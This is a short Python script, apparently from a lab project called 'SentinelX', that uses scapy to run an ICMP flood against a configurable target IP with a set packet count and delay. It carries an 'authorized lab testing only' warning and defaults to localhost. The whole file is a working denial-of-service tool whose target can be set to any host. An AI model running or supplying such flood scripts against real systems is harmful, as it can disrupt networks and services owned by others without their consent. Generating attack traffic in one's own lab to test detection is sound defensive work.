import time
import argparse
from scapy.all import IP, ICMP, send

print("[!] WARNING: This script is for educational purposes and authorized lab testing only.")
print("[!] Do NOT run this on unauthorized networks.\n")

parser = argparse.ArgumentParser(description="SentinelX Lab Tool: ICMP Flood Generator")
parser.add_argument("--target", default="127.0.0.1", help="Target IP address")
parser.add_argument("--count", type=int, default=150, help="Number of packets to send")
parser.add_argument("--delay", type=float, default=0.01, help="Delay between packets")
args = parser.parse_args()

print(f"[*] Starting ICMP Flood against {args.target}")
print(f"[*] Sending {args.count} packets with {args.delay}s delay...")

try:
    packet = IP(dst=args.target)/ICMP()
    for i in range(args.count):
        send(packet, verbose=0)
        time.sleep(args.delay)
    print("\n[+] Attack simulation completed.")
except KeyboardInterrupt:
    print("\n[!] Attack aborted.")
except Exception as e:
    print(f"\n[!] Error: {e}")
